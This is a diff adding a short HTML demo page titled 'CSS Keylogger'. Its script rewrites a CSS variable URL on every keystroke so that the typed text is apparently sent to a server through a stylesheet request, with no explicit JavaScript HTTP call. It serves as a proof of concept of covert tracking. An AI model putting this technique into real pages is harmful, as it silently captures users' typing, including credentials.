@@ -1,0 +1,42 @@
+<!-- 
+@Author: Axel Galicia
+@Date: May 9th, 2019
+
+This is just a demo of how using CSS varibles 
+pages may be able to track user interaction without
+using an HTTP Request created explicitly by JS.
+ -->
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <title>CSS Keylogger</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href="main.css">
+</head>
+
+<body>
+    <div>
+        <h1>CSS Keylogger</h1>
+        <input type="text" id="userText" name="userText" required />
+    </div>
+</body>
+
+<script>
+    // Changing the value of the CSS variable with the new text value
+    const inputText = document.getElementById('userText');
+    const endpoint = 'user-input';
+    const cssVar = '--keyLogURL';
+    inputText.addEventListener("keyup", e => {
+        const value = e.target.value;
+        const cssURL = getComputedStyle(document.documentElement)
+            .getPropertyValue(cssVar);
+        const cssURLSliced = cssURL.slice(0, cssURL.indexOf(endpoint)) + endpoint;
+        const root = document.documentElement;
+        root.style.setProperty(cssVar, `${cssURLSliced}?z=${value}`);
+    });
+
+</script>
+
+</html>
